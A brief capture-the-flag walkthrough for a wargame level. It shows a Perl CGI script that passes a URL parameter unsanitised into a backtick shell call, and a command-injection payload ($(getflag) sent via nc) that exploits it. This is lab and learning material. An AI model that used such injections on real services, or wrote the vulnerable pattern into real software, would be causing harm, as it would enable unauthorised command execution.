## Walkthrough :
- This level 4 contain a perl script : 
```
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print \`echo $y 2>&1\`;
}
x(param("x"));
```
- this program shows that a webserver is listening on localhost:4747 and expecting a x param, which will be passed to a sub routine.
```
print \`echo $y 2>&1\`;
```
- this line allows the output of **echo $y to be passed to the function print**.
- we only need to pass our exploit *$(getflag)* to echo, this will runs as a sub command .
    - connect using
    ```
    nc localhost 4747
    ```
    ```
    - GET /?x=$(getflag)
    ```


## Ressources
- [command substitution](https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html)